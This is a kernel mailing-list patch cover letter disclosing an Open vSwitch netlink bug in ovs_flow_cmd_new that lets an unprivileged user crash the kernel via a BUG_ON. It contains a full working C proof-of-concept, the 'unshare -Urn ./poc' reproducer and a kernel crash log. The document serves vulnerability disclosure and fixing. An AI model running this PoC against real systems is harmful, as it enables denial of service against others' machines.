Received: from mail-pj1-f47.google.com (mail-pj1-f47.google.com [209.85.216.47])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 3008234A773
	for <netdev@vger.kernel.org>; Mon, 27 Jul 2026 16:52:28 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.47
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785171150; cv=none; b=AEEhne+NS2d+sTmCXXZ63aDrUGavCKnP35SlEUEypIHy+zt2hH/EWJl0WAxWrMqPQur9zHacnSAconjBE4pl9JjTpa6gEm1Hzov1us/MJHbEIdKgPbmUpaL96TXts7jmo2LOmFL57IRDDpiXTnvFjqu3IStykqNbiqJPTUh584Q=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785171150; c=relaxed/simple;
	bh=zSXkMXelVKUYoNIbZEl55a5OKyftCYTscfXaJJpEuIE=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=jEk94HcMwjZ8BbBomqySiZKy90w8DKfF8nj0uhMJWhd8BuYBWKD/ZsOhPZ8pzlTaAv4FSHiyskNXI8yFZdTV87pHwkbkREmsJ4y2L/143ZEsw25/O//LZg01RMWjN4mQFSlx8Kf3oCD+eUubiPmGWAhebHKt7Bet36RKX+YxUdk=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=X3FzBATc; arc=none smtp.client-ip=209.85.216.47
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="X3FzBATc"
Received: by mail-pj1-f47.google.com with SMTP id 98e67ed59e1d1-38ec1402b05so2329117a91.2
        for <netdev@vger.kernel.org>; Mon, 27 Jul 2026 09:52:28 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1785171147; x=1785775947; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=Vqfgf4UgQwvJ/mAcjcHQ25p6514pZGpnff2fw76HQu8=;
        b=X3FzBATcvw00WkU8n/XHBXE/ZQSJny8ZnsfNbk0lLAwdsVHDO0ciWQWDOnJbjiXT8l
         qeVm98xUaCAXcd3R6OD1fbRhcPKc5muzE/OkxSKNf7VuD776Vgp3uCY5j0jY5cQosGEv
         8psae68d/kUU0+f5Xi2oG+cvMylrsGXK+x4PQ/CrBVCOkwG9CWYg15tWsDR63/7JXkJu
         tKXgK70QCSqzujnd2pnrCDQXjUYLrpBg3b44zkTWi4F9qweEOW68Oio3ilGpj78jTJ2a
         sb+Ejh3Rq59uY/45fu9IAu4QlHra+PO4l4M70QLuiJEW6l6NgqajgebgwjnixyDeowtL
         aSVQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785171147; x=1785775947;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=Vqfgf4UgQwvJ/mAcjcHQ25p6514pZGpnff2fw76HQu8=;
        b=RcXc3ha6W3/+2dEuVYA8wPTIoj6+XVH0WX0Vo/fZtNnXFa8eSKreNNgBr7OkhN1c9j
         L/6frqBZP53eKDI2EYTxUseoNeLupVlyrsRsldbwErBemQlpohqrqpsT/gXyN51ZJDtD
         5jAUtaitHuzCUV7BN0XsKCEDJkcj+Pr/vps/N4YfwsfnYIpC2wy3KpBTEJY3zTsN2fku
         hjvxg7FT6uwHKN+XDoJ7+mrMRoJh2cFd6vFagmN9eY8X2FADC6i5lTRS/snexdA9zHm7
         JfzOt5xeMGVTTgj2nKNXaYtrW6Eo3MesK5/ztd0eKoUpzY53yqTdoyLDuILIqnfugn9E
         n5OA==
X-Gm-Message-State: AOJu0YyGd/VU6bz3wfUB4FuYGw5Q+ZOMdhzH/sgzM0KIZ9uy/MoggCqt
	GUXig+30Nr6uVv+7f+rD/LuLriQmROKsEH5W/massXpzP8528I8NtyTVZutGMTL3MJw=
X-Gm-Gg: AR+sD10R8GgUgbKG8P/Zwc6fnbfhPbve9ztSbi6lcVRwt8Z9CY8VLIfHzchSMs7SQ6w
	7H6GhkIokGdoiCkumn1Bl9KHlTq3NnULVsqskj21ZuMEgEyAWMR3ZByO5gvbfGQL4pALZAE2oEl
	Y8rv/TIlBuMWSPVMl6pPhNBV7JYXPZrBEeTUj5RPG+eQEwStKnhYj5mEo1jDRYUnLMup13qD5mB
	h3nanhlqA1MtSm9dr1ijmci9SUzC66rKWG3laWEBaloJ+ewDsW1IxiSHUFjtPtw77wnqtFrO1f+
	0U7q+OEYHf/IxkE3gv1ZvJiMmYIJpsCNxVMId1WB2TGRgSKFGmYCQAloV2fhjXkjzTw/T7cFihj
	p3UVQqAlxUHknOW/Kj8a2FDdMKYFn3HJTOA0imbcxVhyPe8nuOgdP3i6reW3038DaEjxZrnn3jJ
	cn43De6N2z7aZSW6ziw4ZQ/nIvuwrabR8=
X-Received: by 2002:a17:90b:5444:b0:387:e0db:bc28 with SMTP id 98e67ed59e1d1-38f29784653mr8044817a91.40.1785171147298;
        Mon, 27 Jul 2026 09:52:27 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([219.141.235.82])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-38f6412acd7sm108735a91.6.2026.07.27.09.52.23
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 27 Jul 2026 09:52:26 -0700 (PDT)
From: Ren Wei <enjou1224z@gmail.com>
To: netdev@vger.kernel.org,
	dev@openvswitch.org
Cc: aconole@redhat.com,
	echaudro@redhat.com,
	i.maximets@ovn.org,
	davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	joestringer@nicira.com,
	pshelar@nicira.com,
	vega@nebusec.ai,
	zhilinz@nebusec.ai,
	enjou1224z@gmail.com
Subject: [PATCH net 0/1] openvswitch: reject mismatched flow ID updates
Date: Tue, 28 Jul 2026 00:52:20 +0800
Message-ID: <cover.1784881178.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zhiling Zou <zhilinz@nebusec.ai>

Hi Linux kernel maintainers,

We found and validated an issue in net/openvswitch/datapath.c. The bug is
reachable by a non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

ovs_flow_cmd_new() allocates the optional reply skb before taking ovs_mutex.
The skb is sized from the identifier in the new request. If the request
carries a UFID, but the UFID lookup misses and the key lookup fallback finds
an existing key-identified flow, the update path replaces that flow's actions
anyway.

When an echoed reply is requested, ovs_flow_cmd_fill_info() serializes the
matched flow's key identifier into an skb sized for the short request UFID.
The fill can return -EMSGSIZE, which then hits BUG_ON(error < 0) in the
update path.

The fix rejects OVS_FLOW_CMD_NEW updates when the duplicate flow was not found
by the same identifier form as the request, keeping UFID-identified and
key-identified flows from being retargeted through the fallback lookup.

Reproducer:

    unshare -Urn ./poc

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <libmnl/libmnl.h>
#include <linux/genetlink.h>
#include <linux/if_ether.h>
#include <linux/netlink.h>
#include <linux/openvswitch.h>
#include <net/if.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define RX_BUF_SIZE 8192
#define UFID_LEN 1
#define GENEVE_OPT_LEN 252
#define ICMPV6_NS 135

static void die(const char *msg)
{
	perror(msg);
	exit(EXIT_FAILURE);
}

static void die_msg(const char *msg)
{
	fprintf(stderr, "%s\n", msg);
	exit(EXIT_FAILURE);
}

static int run_cmd(const char *cmd)
{
	int ret = system(cmd);

	if (ret != 0) {
		fprintf(stderr, "command failed (%d): %s\n", ret, cmd);
		exit(EXIT_FAILURE);
	}

	return ret;
}

static int family_attr_cb(const struct nlattr *attr, void *data)
{
	struct nlattr **tb = data;
	unsigned int type = mnl_attr_get_type(attr);

	if (type <= CTRL_ATTR_MAX)
		tb[type] = (struct nlattr *)attr;
	return MNL_CB_OK;
}

static int resolve_family_id(struct mnl_socket *nl, const char *family)
{
	char buf[MNL_SOCKET_BUFFER_SIZE];
	struct nlmsghdr *nlh;
	struct genlmsghdr *genl;
	struct nlattr *tb[CTRL_ATTR_MAX + 1] = {};
	unsigned int seq = 1;
	int ret;

	nlh = mnl_nlmsg_put_header(buf);
	nlh->nlmsg_type = GENL_ID_CTRL;
	nlh->nlmsg_flags = NLM_F_REQUEST;
	nlh->nlmsg_seq = seq;

	genl = mnl_nlmsg_put_extra_header(nlh, sizeof(*genl));
	genl->cmd = CTRL_CMD_GETFAMILY;
	genl->version = 1;

	mnl_attr_put_strz(nlh, CTRL_ATTR_FAMILY_NAME, family);

	if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0)
		die("mnl_socket_sendto(resolve_family_id)");

	ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
	if (ret < 0)
		die("mnl_socket_recvfrom(resolve_family_id)");

	nlh = (struct nlmsghdr *)buf;
	if (nlh->nlmsg_type == NLMSG_ERROR) {
		struct nlmsgerr *err = mnl_nlmsg_get_payload(nlh);

		errno = -err->error;
		die("resolve_family_id ack");
	}

	mnl_attr_parse(nlh, sizeof(*genl), family_attr_cb, tb);
	if (!tb[CTRL_ATTR_FAMILY_ID])
		die_msg("CTRL_ATTR_FAMILY_ID missing");

	return mnl_attr_get_u16(tb[CTRL_ATTR_FAMILY_ID]);
}

static void put_flow_key(struct nlmsghdr *nlh)
{
	struct ovs_key_ethernet eth = {
		.eth_src = { 0x02, 0x00, 0x00, 0x00, 0x00, 0x01 },
		.eth_dst = { 0x02, 0x00, 0x00, 0x00, 0x00, 0x02 },
	};
	struct ovs_key_ipv6 ipv6 = {
		.ipv6_proto = IPPROTO_ICMPV6,
		.ipv6_tclass = 0x5a,
		.ipv6_hlimit = 64,
		.ipv6_frag = OVS_FRAG_TYPE_NONE,
	};
	struct ovs_key_icmpv6 icmpv6 = {
		.icmpv6_type = ICMPV6_NS,
		.icmpv6_code = 0,
	};
	struct ovs_key_nd nd = { 0 };
	struct in6_addr tun_src = IN6ADDR_LOOPBACK_INIT;
	struct in6_addr tun_dst = {
		.s6_addr = {
			0x20, 0x01, 0x0d, 0xb8, 0, 0, 0, 0,
			0, 0, 0, 0, 0, 0, 0, 0x42,
		},
	};
	uint8_t geneve_opts[GENEVE_OPT_LEN];
	struct nlattr *key;
	struct nlattr *tunnel;
	uint32_t in_port = OVSP_LOCAL;
	__be16 ethertype;
	__be64 tun_id;
	__be16 tp_src;
	__be16 tp_dst;
	uint8_t ttl = 64;
	uint8_t tos = 0x10;
	uint16_t exthdrs = 0;
	size_t i;

	ipv6.ipv6_src[0] = htonl(0x20010db8);
	ipv6.ipv6_src[3] = htonl(1);
	ipv6.ipv6_dst[0] = htonl(0x20010db8);
	ipv6.ipv6_dst[3] = htonl(2);
	ipv6.ipv6_label = htonl(0x12345);
	nd.nd_target[0] = htonl(0x20010db8);
	nd.nd_target[3] = htonl(0x99);
	memcpy(nd.nd_sll, "\x00\x11\x22\x33\x44\x55", ETH_ALEN);
	memcpy(nd.nd_tll, "\x66\x77\x88\x99\xaa\xbb", ETH_ALEN);
	ethertype = htons(ETH_P_IPV6);
	tun_id = htobe64(0x1122334455667788ULL);
	tp_src = htons(12345);
	tp_dst = htons(6081);
	for (i = 0; i < sizeof(geneve_opts); i++)
		geneve_opts[i] = (uint8_t)i;

	key = mnl_attr_nest_start(nlh, OVS_FLOW_ATTR_KEY);
	tunnel = mnl_attr_nest_start(nlh, OVS_KEY_ATTR_TUNNEL);
	mnl_attr_put_u64(nlh, OVS_TUNNEL_KEY_ATTR_ID, tun_id);
	mnl_attr_put(nlh, OVS_TUNNEL_KEY_ATTR_IPV6_SRC, sizeof(tun_src), &tun_src);
	mnl_attr_put(nlh, OVS_TUNNEL_KEY_ATTR_IPV6_DST, sizeof(tun_dst), &tun_dst);
	mnl_attr_put_u8(nlh, OVS_TUNNEL_KEY_ATTR_TOS, tos);
	mnl_attr_put_u8(nlh, OVS_TUNNEL_KEY_ATTR_TTL, ttl);
	mnl_attr_put(nlh, OVS_TUNNEL_KEY_ATTR_TP_SRC, sizeof(tp_src), &tp_src);
	mnl_attr_put(nlh, OVS_TUNNEL_KEY_ATTR_TP_DST, sizeof(tp_dst), &tp_dst);
	mnl_attr_put(nlh, OVS_TUNNEL_KEY_ATTR_GENEVE_OPTS,
		     sizeof(geneve_opts), geneve_opts);
	mnl_attr_nest_end(nlh, tunnel);
	mnl_attr_put_u32(nlh, OVS_KEY_ATTR_IN_PORT, in_port);
	mnl_attr_put(nlh, OVS_KEY_ATTR_ETHERNET, sizeof(eth), &eth);
	mnl_attr_put(nlh, OVS_KEY_ATTR_ETHERTYPE, sizeof(ethertype), &ethertype);
	mnl_attr_put(nlh, OVS_KEY_ATTR_IPV6, sizeof(ipv6), &ipv6);
	mnl_attr_put(nlh, OVS_KEY_ATTR_IPV6_EXTHDRS, sizeof(exthdrs), &exthdrs);
	mnl_attr_put(nlh, OVS_KEY_ATTR_ICMPV6, sizeof(icmpv6), &icmpv6);
	mnl_attr_put(nlh, OVS_KEY_ATTR_ND, sizeof(nd), &nd);
	mnl_attr_nest_end(nlh, key);
}

static void put_empty_actions(struct nlmsghdr *nlh)
{
	struct nlattr *actions;
	uint32_t out_port = OVSP_LOCAL;

	actions = mnl_attr_nest_start(nlh, OVS_FLOW_ATTR_ACTIONS);
	mnl_attr_put_u32(nlh, OVS_ACTION_ATTR_OUTPUT, out_port);
	mnl_attr_nest_end(nlh, actions);
}

static size_t build_new_flow_msg(char *buf, uint16_t family_id, uint32_t seq,
				 uint32_t dp_ifindex, bool include_ufid,
				 uint32_t ufid_flags, uint16_t nlmsg_flags)
{
	static const uint8_t ufid[UFID_LEN] = { 0x41 };
	struct nlmsghdr *nlh;
	struct genlmsghdr *genl;
	struct ovs_header *ovs;

	nlh = mnl_nlmsg_put_header(buf);
	nlh->nlmsg_type = family_id;
	nlh->nlmsg_flags = nlmsg_flags;
	nlh->nlmsg_seq = seq;

	genl = mnl_nlmsg_put_extra_header(nlh, sizeof(*genl));
	genl->cmd = OVS_FLOW_CMD_NEW;
	genl->version = OVS_FLOW_VERSION;

	ovs = mnl_nlmsg_put_extra_header(nlh, sizeof(*ovs));
	ovs->dp_ifindex = dp_ifindex;

	put_flow_key(nlh);
	put_empty_actions(nlh);

	if (include_ufid) {
		mnl_attr_put(nlh, OVS_FLOW_ATTR_UFID, sizeof(ufid), ufid);
		mnl_attr_put_u32(nlh, OVS_FLOW_ATTR_UFID_FLAGS, ufid_flags);
	}

	return nlh->nlmsg_len;
}

static int recv_for_seq(struct mnl_socket *nl, uint32_t seq)
{
	char buf[RX_BUF_SIZE];

	for (;;) {
		struct nlmsghdr *nlh;
		int ret;

		ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
		if (ret < 0)
			return -errno;

		for (nlh = (struct nlmsghdr *)buf; mnl_nlmsg_ok(nlh, ret);
		     nlh = mnl_nlmsg_next(nlh, &ret)) {
			if (nlh->nlmsg_seq != seq)
				continue;

			if (nlh->nlmsg_type == NLMSG_ERROR) {
				struct nlmsgerr *err = mnl_nlmsg_get_payload(nlh);

				return err->error;
			}

			if (!(nlh->nlmsg_flags & NLM_F_MULTI))
				return 0;
		}
	}
}

int main(void)
{
	static const uint32_t omit_all_flags = OVS_UFID_F_OMIT_KEY |
					       OVS_UFID_F_OMIT_MASK |
					       OVS_UFID_F_OMIT_ACTIONS;
	char buf[RX_BUF_SIZE];
	struct mnl_socket *nl;
	uint32_t seq = 10;
	uint16_t flow_family;
	unsigned int dp_ifindex;
	int err;

	run_cmd("ovs-dpctl del-dp dp0 >/dev/null 2>&1 || true");
	run_cmd("ovs-dpctl add-dp dp0 >/dev/null");

	dp_ifindex = if_nametoindex("dp0");
	if (!dp_ifindex)
		die("if_nametoindex(dp0)");

	nl = mnl_socket_open(NETLINK_GENERIC);
	if (!nl)
		die("mnl_socket_open");

	if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0)
		die("mnl_socket_bind");

	flow_family = resolve_family_id(nl, OVS_FLOW_FAMILY);

	printf("[*] ovs_flow family id: %u\n", flow_family);
	printf("[*] datapath ifindex: %u\n", dp_ifindex);

	build_new_flow_msg(buf, flow_family, ++seq, dp_ifindex, false, 0,
			   NLM_F_REQUEST | NLM_F_ACK);
	if (mnl_socket_sendto(nl, buf, ((struct nlmsghdr *)buf)->nlmsg_len) < 0)
		die("send initial key flow");

	err = recv_for_seq(nl, seq);
	if (err) {
		errno = -err;
		die("initial key flow failed");
	}
	printf("[+] inserted initial key-identified flow\n");

	printf("[*] sending echoed replacement with nonexistent 1-byte UFID and omit-all UFID flags\n");
	fflush(stdout);

	build_new_flow_msg(buf, flow_family, ++seq, dp_ifindex, true,
			   omit_all_flags,
			   NLM_F_REQUEST | NLM_F_ACK | NLM_F_ECHO);
	if (mnl_socket_sendto(nl, buf, ((struct nlmsghdr *)buf)->nlmsg_len) < 0)
		die("send mismatched UFID replacement");

	err = recv_for_seq(nl, seq);
	if (err) {
		errno = -err;
		die("replacement returned error");
	}

	printf("[-] replacement unexpectedly completed without a crash\n");
	mnl_socket_close(nl);
	return EXIT_FAILURE;
}

------END poc.c--------

----BEGIN crash log----

[  274.747363][ T9849] kernel BUG at net/openvswitch/datapath.c:1138!
[  274.748774][ T9849] Oops: invalid opcode: 0000 [#1] SMP KASAN NOPTI
[  274.749751][ T9849] CPU: 0 UID: 1028 PID: 9849 Comm: poc Not tainted 7.1.0-rc1 #2 PREEMPT(full)
[  274.750939][ T9849] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  274.752848][ T9849] RIP: 0010:ovs_flow_cmd_new (/home/roxy/linux-block-patch/build/../net/openvswitch/datapath.c:1128 (discriminator 7))
[  274.753894][ T9849] Code: df 48 89 4c 24 40 e8 fd 72 b2 f7 48 8b 4c 24 40 e9 50 f8 ff ff e8 ee 72 b2 f7 e9 27 f8 ff ff e8 e4 72 b2 f7 e9 04 f9 ff ff 90 <0f> 0b 48 8b 7c 24 20 e8 d2 72 b2 f7 e9 37 f9 ff ff e8 b8 73 b2 f7
All code
========
   0:	df 48 89             	fisttps -0x77(%rax)
   3:	4c 24 40             	rex.WR and $0x40,%al
   6:	e8 fd 72 b2 f7       	call   0xfffffffff7b27308
   b:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
  10:	e9 50 f8 ff ff       	jmp    0xfffffffffffff865
  15:	e8 ee 72 b2 f7       	call   0xfffffffff7b27308
  1a:	e9 27 f8 ff ff       	jmp    0xfffffffffffff846
  1f:	e8 e4 72 b2 f7       	call   0xfffffffff7b27308
  24:	e9 04 f9 ff ff       	jmp    0xfffffffffffff92d
  29:	90                   	nop
  2a:*	0f 0b                	ud2		<-- trapping instruction
  2c:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
  31:	e8 d2 72 b2 f7       	call   0xfffffffff7b27308
  36:	e9 37 f9 ff ff       	jmp    0xfffffffffffff972
  3b:	e8 b8 73 b2 f7       	call   0xfffffffff7b273f8

Code starting with the faulting instruction
===========================================
   0:	0f 0b                	ud2
   2:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   7:	e8 d2 72 b2 f7       	call   0xfffffffff7b272de
   c:	e9 37 f9 ff ff       	jmp    0xfffffffffffff948
  11:	e8 b8 73 b2 f7       	call   0xfffffffff7b273ce
[  274.757022][ T9849] RSP: 0018:ffa000001380f458 EFLAGS: 00010286
[  274.758074][ T9849] RAX: 00000000ffffffa6 RBX: 0000000000000000 RCX: 0000000000000007
[  274.759378][ T9849] RDX: 0000000000000001 RSI: 0000000000000000 RDI: ff11000076458efc
[  274.760612][ T9849] RBP: ffa000001380f808 R08: 0000000000000000 R09: ff1100006f14c400
[  274.761888][ T9849] R10: ff1100010c87572f R11: ff1100010c875603 R12: ff1100010c870200
[  274.763332][ T9849] R13: ff11000070574330 R14: ff110001125bce40 R15: ff11000076458e40
[  274.764505][ T9849] FS:  00007f7a21c95780(0000) GS:ff11000184acf000(0000) knlGS:0000000000000000
[  274.765986][ T9849] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  274.767055][ T9849] CR2: 00007ffc17011cc0 CR3: 0000000069884000 CR4: 0000000000751ef0
[  274.768294][ T9849] PKRU: 55555554
[  274.768969][ T9849] Call Trace:
[  274.769398][ T9849]  <TASK>
[  274.769840][ T9849]  ? __pfx_ovs_flow_cmd_new (/home/roxy/linux-block-patch/build/../net/openvswitch/datapath.c:1313)
[  274.770900][ T9849]  ? kasan_save_stack (/home/roxy/linux-block-patch/build/../mm/kasan/common.c:57)
[  274.771723][ T9849]  ? __kasan_kmalloc (/home/roxy/linux-block-patch/build/../mm/kasan/common.c:398 /home/roxy/linux-block-patch/build/../mm/kasan/common.c:415)
[  274.772331][ T9849]  ? __kmalloc_noprof (/home/roxy/linux-block-patch/build/../mm/slub.c:2458 (discriminator 1) /home/roxy/linux-block-patch/build/../mm/slub.c:4580 (discriminator 1) /home/roxy/linux-block-patch/build/../mm/slub.c:4898 (discriminator 1) /home/roxy/linux-block-patch/build/../mm/slub.c:5294 (discriminator 1) /home/roxy/linux-block-patch/build/../mm/slub.c:5307 (discriminator 1))
[  274.773156][ T9849]  ? genl_family_rcv_msg_attrs_parse.isra.0 (/home/roxy/linux-block-patch/build/../net/netlink/genetlink.c:935)
[  274.774302][ T9849]  ? genl_rcv (/home/roxy/linux-block-patch/build/../net/netlink/genetlink.c:1218)
[  274.775037][ T9849]  ? netlink_unicast (/home/roxy/linux-block-patch/build/../net/netlink/af_netlink.c:1314 /home/roxy/linux-block-patch/build/../net/netlink/af_netlink.c:1344)
[  274.775912][ T9849]  ? netlink_sendmsg (/home/roxy/linux-block-patch/build/../net/netlink/af_netlink.c:1875)
[  274.776707][ T9849]  ? __sys_sendto (/home/roxy/linux-block-patch/build/../net/socket.c:787 (discriminator 2) /home/roxy/linux-block-patch/build/../net/socket.c:802 (discriminator 2) /home/roxy/linux-block-patch/build/../net/socket.c:2265 (discriminator 2))
[  274.777553][ T9849]  ? __x64_sys_sendto (/home/roxy/linux-block-patch/build/../net/socket.c:2272 /home/roxy/linux-block-patch/build/../net/socket.c:2268 /home/roxy/linux-block-patch/build/../net/socket.c:2268)
[  274.778570][ T9849]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  274.779529][ T9849]  ? __nla_parse (/home/roxy/linux-block-patch/build/../lib/nlattr.c:732)
[  274.780409][ T9849]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  274.781320][ T9849]  ? genl_family_rcv_msg_attrs_parse.isra.0 (/home/roxy/linux-block-patch/build/../include/net/netlink.h:784 /home/roxy/linux-block-patch/build/../net/netlink/genetlink.c:944)
[  274.782469][ T9849]  genl_family_rcv_msg_doit (/home/roxy/linux-block-patch/build/../net/netlink/genetlink.c:1114)
[  274.783417][ T9849]  ? __pfx_genl_family_rcv_msg_doit (/home/roxy/linux-block-patch/build/../include/net/netlink.h:785 (discriminator 1))
[  274.784405][ T9849]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  274.785313][ T9849]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  274.786378][ T9849]  ? security_capable (/home/roxy/linux-block-patch/build/../security/security.c:661)
[  274.787236][ T9849]  genl_rcv_msg (/home/roxy/linux-block-patch/build/../net/netlink/genetlink.c:1190 /home/roxy/linux-block-patch/build/../net/netlink/genetlink.c:1209)
[  274.787983][ T9849]  ? __pfx_genl_rcv_msg (/home/roxy/linux-block-patch/build/../net/netlink/genetlink.c:1079)
[  274.788648][ T9849]  ? __pfx_ovs_flow_cmd_new (/home/roxy/linux-block-patch/build/../net/openvswitch/datapath.c:1313)
[  274.789362][ T9849]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  274.790095][ T9849]  ? __lock_acquire (/home/roxy/linux-block-patch/build/../kernel/locking/lockdep.c:4674 /home/roxy/linux-block-patch/build/../kernel/locking/lockdep.c:5191)
[  274.790790][ T9849]  netlink_rcv_skb (/home/roxy/linux-block-patch/build/../net/netlink/af_netlink.c:2547)
[  274.791410][ T9849]  ? __pfx_genl_rcv_msg (/home/roxy/linux-block-patch/build/../net/netlink/genetlink.c:1079)
[  274.792085][ T9849]  ? __pfx_netlink_rcv_skb (/home/roxy/linux-block-patch/build/../include/linux/skbuff.h:2717)
[  274.792820][ T9849]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  274.793549][ T9849]  ? netlink_deliver_tap (/home/roxy/linux-block-patch/build/../include/linux/rcupdate.h:839 (discriminator 1) /home/roxy/linux-block-patch/build/../net/netlink/af_netlink.c:335 (discriminator 1))
[  274.794264][ T9849]  genl_rcv (/home/roxy/linux-block-patch/build/../net/netlink/genetlink.c:1218)
[  274.794799][ T9849]  netlink_unicast (/home/roxy/linux-block-patch/build/../net/netlink/af_netlink.c:1314 /home/roxy/linux-block-patch/build/../net/netlink/af_netlink.c:1344)
[  274.795427][ T9849]  ? __pfx_netlink_unicast (/home/roxy/linux-block-patch/build/../arch/x86/include/asm/bitops.h:202 (discriminator 1))
[  274.796124][ T9849]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  274.796895][ T9849]  ? __check_object_size (/home/roxy/linux-block-patch/build/../arch/x86/include/asm/page_64.h:44 (discriminator 1) /home/roxy/linux-block-patch/build/../mm/usercopy.c:138 (discriminator 1) /home/roxy/linux-block-patch/build/../mm/usercopy.c:261 (discriminator 1) /home/roxy/linux-block-patch/build/../mm/usercopy.c:223 (discriminator 1))
[  274.797619][ T9849]  netlink_sendmsg (/home/roxy/linux-block-patch/build/../net/netlink/af_netlink.c:1875)
[  274.798260][ T9849]  ? __pfx_netlink_sendmsg (/home/roxy/linux-block-patch/build/../include/net/net_namespace.h:419 (discriminator 7))
[  274.798974][ T9849]  __sys_sendto (/home/roxy/linux-block-patch/build/../net/socket.c:787 (discriminator 2) /home/roxy/linux-block-patch/build/../net/socket.c:802 (discriminator 2) /home/roxy/linux-block-patch/build/../net/socket.c:2265 (discriminator 2))
[  274.799568][ T9849]  ? __pfx___sys_sendto (/home/roxy/linux-block-patch/build/../net/socket.c:2219)
[  274.800259][ T9849]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  274.801019][ T9849]  ? ksys_write (/home/roxy/linux-block-patch/build/../include/linux/file.h:78 /home/roxy/linux-block-patch/build/../include/linux/file.h:85 /home/roxy/linux-block-patch/build/../fs/read_write.c:731)
[  274.801634][ T9849]  ? __pfx_ksys_write (/home/roxy/linux-block-patch/build/../fs/read_write.c:724)
[  274.802282][ T9849]  __x64_sys_sendto (/home/roxy/linux-block-patch/build/../net/socket.c:2272 /home/roxy/linux-block-patch/build/../net/socket.c:2268 /home/roxy/linux-block-patch/build/../net/socket.c:2268)
[  274.802908][ T9849]  ? do_syscall_64 (/home/roxy/linux-block-patch/build/../include/linux/entry-common.h:177 /home/roxy/linux-block-patch/build/../arch/x86/entry/syscall_64.c:89)
[  274.803630][ T9849]  ? srso_alias_return_thunk (/home/roxy/linux-block-patch/build/../arch/x86/lib/retpoline.S:220)
[  274.804584][ T9849]  ? lockdep_hardirqs_on (/home/roxy/linux-block-patch/build/../kernel/locking/lockdep.c:4472)
[  274.805365][ T9849]  do_syscall_64 (/home/roxy/linux-block-patch/build/../arch/x86/entry/syscall_64.c:63 /home/roxy/linux-block-patch/build/../arch/x86/entry/syscall_64.c:94)
[  274.805972][ T9849]  ? irqentry_exit (/home/roxy/linux-block-patch/build/../include/linux/irq-entry-common.h:280 /home/roxy/linux-block-patch/build/../include/linux/irq-entry-common.h:325 /home/roxy/linux-block-patch/build/../kernel/entry/common.c:162)
[  274.806598][ T9849]  entry_SYSCALL_64_after_hwframe (/home/roxy/linux-block-patch/build/../arch/x86/entry/entry_64.S:121)
[  274.807451][ T9849] RIP: 0033:0x7f7a21d27687
